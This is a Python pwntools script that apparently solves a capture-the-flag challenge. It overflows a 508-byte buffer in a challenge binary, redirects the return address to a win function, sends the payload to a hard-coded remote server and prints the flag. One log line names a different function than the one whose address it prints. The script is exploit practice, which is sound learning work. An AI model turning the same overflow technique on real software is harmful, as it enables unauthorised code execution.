from pwn import *
 
context.arch = 'i386'
 
# create ELF object of the challenge's files we want to exploit
elf = ELF("./chl")
 
 
# offset before hitting the return address
overflow_offset = 508
overflow = b'A' * overflow_offset
 
# connect to server
r = remote('167.71.207.218', 50602)
 
# craft full payload (including win()'s address)
log.info("sub_10b0's address: " + str(hex(elf.symbols['sub_1090'])))
payload = overflow + p32(elf.symbols['sub_1090'])
 
# send exploit once prompted
r.sendlineafter("Please enter your string: \n", payload)
 
# get the "Okay, time to return... Fingers Crossed... " message returned to us
msg = r.recvuntil("\n")
log.info(str(msg))
flag = r.recv()
log.info(str(flag))
 
r.close()
